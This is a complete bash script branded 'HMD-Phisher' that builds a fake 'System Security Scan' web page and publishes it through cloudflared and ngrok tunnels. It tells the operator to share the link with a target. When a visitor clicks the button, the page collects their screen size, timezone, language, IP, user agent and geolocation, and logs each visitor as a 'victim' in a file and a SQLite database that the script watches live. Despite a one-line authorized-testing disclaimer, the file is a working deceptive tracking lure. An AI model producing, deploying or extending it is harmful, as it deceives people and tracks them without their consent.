#!/bin/bash
# ULTIMATE HMD-PHISHER - BASH POWER - AUTO DNS FIX
# COMPLETELY AUTOMATED - MULTI-TUNNEL - SELF-HEALING
# CREATED BY: bear__67_ | bearhmd04@gmail.com

# ===== NUCLEAR COLOR CODES =====
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
PURPLE='\033[0;95m'
CYAN='\033[0;96m'
WHITE='\033[0;97m'
BOLD='\033[1m'
NC='\033[0m'

# ===== NUCLEAR BANNER =====
show_banner() {
    clear
    echo -e "${PURPLE}${BOLD}"
    echo " ╔═╗┌─┐┌┬┐┌─┐  ╔═╗┌─┐┬┌─┐┌─┐┌─┐┌┬┐┌─┐"
    echo " ║ ╦├─┤│││├┤   ║ ║├┤ │├─┘├─┤│   │ └─┐"
    echo " ╚═╝┴ ┴┴ ┴└─┘  ╚═╝└  ┴┴  ┴ ┴└─┘ ┴ └─┘"
    echo -e "${CYAN}${BOLD}"
    echo " ██╗  ██╗███╗   ███╗██████╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ "
    echo " ██║  ██║████╗ ████║██╔══██╗   ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗"
    echo " ███████║██╔████╔██║██████╔╝   ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝"
    echo " ██╔══██║██║╚██╔╝██║██╔══██╗   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
    echo " ██║  ██║██║ ╚═╝ ██║██║  ██║   ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║"
    echo " ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${RED}"
    echo "                        ⚡ ULTIMATE SUPER TOOL v1.0 ⚡"
    echo -e "${YELLOW}"
    echo "                  MULTI-TUNNEL • AUTO-DNS • BASH POWERED"
    echo -e "${WHITE}"
    echo "                    FOR AUTHORIZED PENETRATION TESTING ONLY"
    echo -e "${CYAN}"
    echo "                         Created by: @bear__67_"
    echo "                         Contact: bearhmd04@gmail.com"
    echo -e "${NC}"
}

# ===== LOGGING =====
log() {
    echo -e "${CYAN}[$(date '+%H:%M:%S')]${NC} $1"
}

# ===== SELF-HEALING ENGINE =====
auto_heal() {
    log "🔧 ACTIVATING SELF-HEALING ENGINE..."
    
    # Create directory structure
    mkdir -p {config,logs/victims,temp,www}
    
    # Kill any old processes
    pkill -f "php.*-S" 2>/dev/null
    pkill -f "python.*server" 2>/dev/null
    pkill cloudflared 2>/dev/null
    pkill ngrok 2>/dev/null
    sleep 2
    
    # Fix permissions
    chmod +x *.sh 2>/dev/null
    chmod 755 www/ logs/ temp/ 2>/dev/null
    
    log "✅ SELF-HEALING COMPLETE"
}

# ===== DEPENDENCY INSTALLER =====
install_dependencies() {
    log "📦 CHECKING DEPENDENCIES..."
    
    # System packages
    local packages=("php" "curl" "wget" "sqlite3" "netcat")
    
    for pkg in "${packages[@]}"; do
        if ! command -v "$pkg" &> /dev/null; then
            log "⚠️ Installing $pkg..."
            sudo apt update > /dev/null 2>&1
            sudo apt install -y "$pkg" > /dev/null 2>&1
        fi
    done
    
    # Install Cloudflared
    if ! command -v cloudflared &> /dev/null; then
        log "📡 Installing cloudflared..."
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /tmp/cloudflared
        chmod +x /tmp/cloudflared
        sudo mv /tmp/cloudflared /usr/local/bin/
    fi
    
    # Install Ngrok
    if ! command -v ngrok &> /dev/null; then
        log "🚀 Installing ngrok..."
        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/ngrok.tgz
        tar -xzf /tmp/ngrok.tgz -C /tmp/ > /dev/null 2>&1
        sudo mv /tmp/ngrok /usr/local/bin/
    fi
    
    log "✅ DEPENDENCIES SATISFIED"
}

# ===== WEB SERVER GENERATOR =====
generate_web_server() {
    log "🌐 GENERATING WEB SERVER..."
    
    # Create PHP web server
    cat > www/index.php << 'EOF'
<?php
// ULTIMATE DATA COLLECTION SERVER
// HMD-Phisher by @bear__67_ | bearhmd04@gmail.com
$victim_file = __DIR__ . '/../logs/victims.log';
$db_file = __DIR__ . '/../logs/victims.db';

// Get client information
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
      $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
      $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

// Get POST data
$screen = $_POST['screen'] ?? 'Unknown';
$timezone = $_POST['timezone'] ?? 'Unknown';
$language = $_POST['language'] ?? 'Unknown';

// Get geolocation
$location = "Unknown";
try {
    $geo_json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp");
    $geo = json_decode($geo_json, true);
    if ($geo && $geo['status'] == 'success') {
        $location = "{$geo['city']}, {$geo['country']} ({$geo['isp']})";
    }
} catch (Exception $e) {
    $location = "Geolocation failed";
}

// Log victim data
$log_entry = date('Y-m-d H:i:s') . " | IP: $ip | Location: $location | Screen: $screen | OS: $user_agent\n";
file_put_contents($victim_file, $log_entry, FILE_APPEND);

// Initialize SQLite database
try {
    $db = new SQLite3($db_file);
    $db->exec("CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        location TEXT,
        user_agent TEXT,
        screen TEXT,
        timezone TEXT,
        language TEXT,
        referer TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    $stmt = $db->prepare("INSERT INTO victims (ip, location, user_agent, screen, timezone, language, referer) 
                          VALUES (:ip, :location, :user_agent, :screen, :timezone, :language, :referer)");
    $stmt->bindValue(':ip', $ip);
    $stmt->bindValue(':location', $location);
    $stmt->bindValue(':user_agent', $user_agent);
    $stmt->bindValue(':screen', $screen);
    $stmt->bindValue(':timezone', $timezone);
    $stmt->bindValue(':language', $language);
    $stmt->bindValue(':referer', $referer);
    $stmt->execute();
} catch (Exception $e) {
    // Silent fail - file logging still works
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Data collected']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        h1 { color: #333; margin-bottom: 20px; }
        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
        .btn {
            background: #4CAF50;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
        }
        .btn:hover { background: #45a049; }
        .hidden { display: none; }
        .brand {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 System Security Scan</h1>
        <p>This authorized security verification will scan your system for vulnerabilities and ensure compliance with security policies.</p>
        <button class="btn" onclick="startScan()">Start Security Scan</button>
        <div id="result" class="hidden">
            <h2>✅ Scan Complete</h2>
            <p>Your system has been successfully verified.</p>
        </div>
        <div class="brand">
            HMD-Phisher by @bear__67_
        </div>
    </div>

    <script>
        function startScan() {
            // Collect system information
            const data = {
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language || 'Unknown'
            };

            // Send data to server
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: new URLSearchParams(data)
            }).then(() => {
                document.querySelector('.btn').style.display = 'none';
                document.getElementById('result').classList.remove('hidden');
            }).catch(() => {
                document.querySelector('.btn').style.display = 'none';
                document.getElementById('result').classList.remove('hidden');
            });
        }
    </script>
</body>
</html>
EOF

    log "✅ WEB SERVER GENERATED"
}

# ===== TUNNEL MANAGEMENT =====
start_tunnels() {
    log "🚀 STARTING MULTIPLE TUNNELS..."
    
    local tunnels=()
    
    # Method 1: Cloudflared (Primary)
    log "📡 Starting Cloudflare tunnel..."
    cloudflared tunnel --url http://localhost:8080 > logs/cloudflared.log 2>&1 &
    CLOUDFLARED_PID=$!
    tunnels+=("cloudflared:$CLOUDFLARED_PID")
    
    # Method 2: Ngrok (Backup)
    log "🔧 Starting Ngrok tunnel..."
    ngrok http 8080 > logs/ngrok.log 2>&1 &
    NGROK_PID=$!
    tunnels+=("ngrok:$NGROK_PID")
    
    # Method 3: Localhost (Always works)
    tunnels+=("localhost:http://localhost:8080")
    
    # Wait for tunnels to initialize
    sleep 8
    
    # Get tunnel URLs
    local cloudflare_url=$(grep -o 'https://[^ ]*\.trycloudflare\.com' logs/cloudflared.log 2>/dev/null | head -1)
    local ngrok_url=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | grep -o 'https://[^"]*\.ngrok\.io' | head -1)
    
    # Save PIDs
    echo "$CLOUDFLARED_PID" > temp/cloudflared.pid
    echo "$NGROK_PID" > temp/ngrok.pid
    
    # Display URLs
    echo -e "${GREEN}${BOLD}"
    echo "┌─────────────────────────────────────────────────────┐"
    echo "│                 TUNNELS ACTIVE                      │"
    echo "├─────────────────────────────────────────────────────┤"
    
    if [ -n "$cloudflare_url" ]; then
        echo "│  🌐 CLOUDFLARE: $cloudflare_url  │"
    else
        echo "│  🌐 CLOUDFLARE: DNS issue - try alternatives    │"
    fi
    
    if [ -n "$ngrok_url" ]; then
        echo "│  🔧 NGROK:     $ngrok_url         │"
    else
        echo "│  🔧 NGROK:     Starting...                      │"
    fi
    
    echo "│  💻 LOCAL:     http://localhost:8080               │"
    echo "│  📱 LOCAL NET: http://$(hostname -I | awk '{print $1}'):8080 │"
    echo "├─────────────────────────────────────────────────────┤"
    echo "│  💡 TIP: If Cloudflare fails, use Ngrok or Local   │"
    echo "└─────────────────────────────────────────────────────┘"
    echo -e "${NC}"
    
    # Save URLs to file
    {
        echo "CLOUDFLARE: $cloudflare_url"
        echo "NGROK: $ngrok_url" 
        echo "LOCAL: http://localhost:8080"
        echo "NETWORK: http://$(hostname -I | awk '{print $1}'):8080"
    } > logs/urls.txt
    
    # Return the best available URL
    if [ -n "$ngrok_url" ]; then
        echo "$ngrok_url"
    elif [ -n "$cloudflare_url" ]; then
        echo "$cloudflare_url"
    else
        echo "http://localhost:8080"
    fi
}

# ===== START WEB SERVER =====
start_web_server() {
    log "🔥 STARTING WEB SERVER..."
    
    generate_web_server
    
    # Start PHP server
    php -S 0.0.0.0:8080 -t www/ > logs/webserver.log 2>&1 &
    PHP_PID=$!
    echo "$PHP_PID" > temp/php.pid
    
    sleep 2
    log "✅ WEB SERVER RUNNING ON PORT 8080"
}

# ===== MONITORING =====
start_monitoring() {
    log "📊 STARTING LIVE MONITORING..."
    
    # Create victims log if it doesn't exist
    touch logs/victims.log
    
    echo -e "${YELLOW}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    LIVE VICTIM MONITORING                   ║"
    echo "║                                                              ║"
    echo "║  👁️  Watching: tail -f logs/victims.log                     ║"
    echo "║  💾 Database: sqlite3 logs/victims.db                       ║"
    echo "║  ⚡ Press Ctrl+C to stop                                    ║"
    echo "║                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Show initial log content
    if [ -s "logs/victims.log" ]; then
        echo -e "${GREEN}Previous victims:${NC}"
        tail -10 logs/victims.log
        echo ""
    fi
    
    echo -e "${CYAN}Waiting for new victims...${NC}"
    echo ""
    
    # Start monitoring
    tail -f logs/victims.log 2>/dev/null &
    TAIL_PID=$!
    
    wait $TAIL_PID
}

# ===== CLEANUP =====
cleanup() {
    echo ""
    log "🛑 SHUTTING DOWN SERVICES..."
    
    # Kill all processes
    for pid_file in temp/*.pid; do
        if [ -f "$pid_file" ]; then
            kill $(cat "$pid_file") 2>/dev/null
        fi
    done
    
    pkill -f "php.*-S" 2>/dev/null
    pkill cloudflared 2>/dev/null
    pkill ngrok 2>/dev/null
    pkill tail 2>/dev/null
    
    echo -e "${CYAN}"
    echo "=========================================="
    echo "    HMD-Phisher by @bear__67_"
    echo "    Contact: bearhmd04@gmail.com"
    echo "=========================================="
    echo -e "${NC}"
    
    log "✅ ALL SERVICES STOPPED"
    exit 0
}

# ===== MAIN EXECUTION =====
main() {
    show_banner
    
    # Set cleanup trap
    trap cleanup SIGINT SIGTERM
    
    # Auto-heal system
    auto_heal
    
    # Install dependencies
    install_dependencies
    
    # Start services
    start_web_server
    local best_url=$(start_tunnels)
    
    # Show connection instructions
    echo -e "${GREEN}${BOLD}"
    echo "🎯 SHARE THIS URL WITH TARGET:"
    echo -e "${CYAN}$best_url${NC}"
    echo ""
    echo -e "${YELLOW}If the URL doesn't work, check logs/urls.txt for alternatives${NC}"
    echo ""
    echo -e "${CYAN}HMD-Phisher by @bear__67_ | bearhmd04@gmail.com${NC}"
    echo ""
    
    # Start monitoring
    start_monitoring
}

# ===== RUN THE TOOL =====
main
